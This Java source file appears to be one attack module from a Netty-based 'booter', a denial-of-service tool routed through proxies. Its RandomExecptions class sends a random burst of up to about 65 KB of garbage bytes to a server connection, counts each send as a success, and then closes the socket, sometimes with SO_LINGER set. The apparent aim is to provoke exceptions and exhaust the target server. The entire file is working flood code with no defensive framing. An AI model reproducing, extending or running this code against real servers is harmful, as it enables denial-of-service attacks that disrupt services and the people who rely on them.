package me.nzxtercode.nettybooter.methods.impl;

import java.security.SecureRandom;

import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import io.netty.channel.ChannelOption;
import me.nzxtercode.nettybooter.methods.interfaces.IMethod;
import me.nzxtercode.nettybooter.proxy.ProxyManager;
import me.nzxtercode.nettybooter.utils.NettyBootstrap;

/**
 * The type Random execptions.
 */
public class RandomExecptions implements IMethod {

	private static final SecureRandom RANDOM = new SecureRandom();

	public void accept(Channel channel, ProxyManager.Proxy proxy) {
		byte[] bytes = new byte[5 + RANDOM.nextInt(65534)];
		RANDOM.nextBytes(bytes);
		channel.writeAndFlush(Unpooled.buffer().writeBytes(bytes));
		NettyBootstrap.success++;
		if (RANDOM.nextBoolean())
			channel.config().setOption(ChannelOption.SO_LINGER, 1);
		channel.close();
	}
}
